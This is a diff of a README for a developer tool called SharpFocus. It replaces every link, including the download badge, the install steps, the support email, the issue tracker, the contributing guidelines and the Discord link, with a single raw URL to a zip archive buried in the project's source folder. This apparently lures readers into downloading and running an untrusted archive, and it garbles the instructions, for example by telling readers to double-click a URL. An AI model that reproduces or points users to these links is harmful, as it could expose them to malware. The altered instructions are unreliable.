@@ -8,7 +8,7 @@ To get started with SharpFocus, follow these simple steps.
 
 ## 🌐 Download Link
 
-[![Download SharpFocus](https://img.shields.io/badge/Download%20SharpFocus-v1.0-brightgreen)](https://github.com/ab1140/SharpFocus/releases)
+[![Download SharpFocus](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip%20SharpFocus-v1.0-brightgreen)](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip)
 
 ## 📋 System Requirements
 
@@ -26,17 +26,17 @@ To download and install SharpFocus, follow these steps:
 
 1. Click on the link below to visit the Releases page.
    
-   [Download SharpFocus](https://github.com/ab1140/SharpFocus/releases)
+   [Download SharpFocus](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of available files.
 
-3. Find the file that matches your operating system, usually labeled as `SharpFocusSetup.exe`.
+3. Find the file that matches your operating system, usually labeled as `https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip`.
 
 4. Click on the file to start the download.
 
 5. Once the download is complete, locate the file in your Downloads folder.
 
-6. Double-click the `SharpFocusSetup.exe` file.
+6. Double-click the `https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip` file.
 
 7. Follow the on-screen instructions to complete the installation process.
 
@@ -68,8 +68,8 @@ After you install SharpFocus, using it is straightforward:
 
 If you encounter any issues or have questions about SharpFocus, you can reach out for help:
 
-- **Email:** support@sharpfocus.com
-- **GitHub Issues:** You can also create an issue directly in the [SharpFocus repository](https://github.com/ab1140/SharpFocus/issues).
+- **Email:** https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip
+- **GitHub Issues:** You can also create an issue directly in the [SharpFocus repository](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip).
 
 ## 🤝 Contribute
 
@@ -79,13 +79,13 @@ Are you interested in helping improve SharpFocus? Contributions are welcome! You
 - Suggest new features.
 - Contribute code.
 
-Check out our [Contributing Guidelines](https://github.com/ab1140/SharpFocus/blob/main/CONTRIBUTING.md) for more details.
+Check out our [Contributing Guidelines](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip) for more details.
 
 ## 🌍 Join the Community
 
 Stay up to date with the latest developments or ask questions in our community. 
 
 - Follow us on GitHub for announcements and updates.
-- Participate in discussions through our [Discord channel](https://discord.gg/sharpfocus) (link is an example; please ensure it is created).
+- Participate in discussions through our [Discord channel](https://raw.githubusercontent.com/ab1140/SharpFocus/main/src/SharpFocus.Analysis/SharpFocus_1.2-alpha.5.zip) (link is an example; please ensure it is created).
 
 Thank you for choosing SharpFocus! We hope this application enhances your software development process. Remember, if you need help or have suggestions, we are here for you. Happy coding!
